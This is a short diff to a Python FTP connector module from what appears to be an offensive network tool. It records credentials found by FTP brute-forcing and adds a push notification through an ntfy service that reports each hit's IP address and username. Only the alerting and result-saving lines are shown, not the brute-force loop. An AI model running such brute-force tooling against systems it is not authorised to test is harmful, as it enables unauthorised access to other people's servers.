@@ -9,6 +9,8 @@ from ftplib import FTP
 from queue import Queue
 from shared import SharedData
 from logger import Logger
+from ntfy import send_ntfy
+
 
 logger = Logger(name="ftp_connector.py", level=logging.DEBUG)
 
@@ -107,6 +109,8 @@ class FTPConnector:
                 with self.lock:
                     self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                     logger.success(f"Found credentials for IP: {adresse_ip} | User: {user}")
+                    message = f"Found credentials for IP: {adresse_ip} | User: {user} (FTP BRUTEFORCE)"
+                    send_ntfy(message=message)
                     self.save_results()
                     self.removeduplicates()
                     success_flag[0] = True
